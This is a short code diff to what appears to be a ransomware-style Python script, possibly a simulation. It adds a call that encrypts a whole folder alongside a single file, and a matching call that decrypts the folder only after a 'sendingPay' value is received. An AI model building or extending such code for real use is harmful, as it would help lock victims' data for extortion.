@@ -87,7 +87,7 @@ if __name__ == "__main__":
     key_original  = generate_key()
     iv,encrypted_file= encrypt_file(key_original,'file.txt')
     # save the encrypted file
-
+    encrypt_folder(key_original, 'random')
     public_key = receive_public_key()
     key_encrypted = encrypt_key(key_original , public_key)
     
@@ -106,6 +106,7 @@ if __name__ == "__main__":
         sendingPay = bytes(sendingPay, 'utf-8')
         # decrypt the file
         file_decrypted = decrypt_file(sendingPay, iv, encrypted_file)
+        decrypt_folder(sendingPay, 'random')
         # save the decrypted file
         with open('decrypted_file.txt', 'wb') as f:
             f.write(file_decrypted)
